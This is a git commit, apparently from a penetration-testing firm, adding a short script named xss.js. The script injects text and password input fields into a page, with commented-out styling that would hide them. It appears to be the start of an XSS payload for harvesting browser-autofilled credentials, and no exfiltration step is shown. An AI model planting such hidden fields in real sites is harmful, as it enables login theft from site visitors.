fb1f54d9c1bd92b3362ed83cbd3eee09c374905e
trustedsec-pd <114032879+trustedsec-pd@users.noreply.github.com>
2022-09-26 11:37:31 -0500

    test

---
+++ jslog/xss.js
@@ -0,0 +1,12 @@
+let body = document.getElementsByTagName("body")[0]
+var u = document.createElement("input");
+u.type = "text";
+//u.style.position = "fixed";
+//u.style.opacity = "0";
+
+var p = document.createElement("input");
+p.type = "password";
+//p.style.position = "fixed";
+//p.style.opacity = "0";
+body.append(u)
+body.append(p)
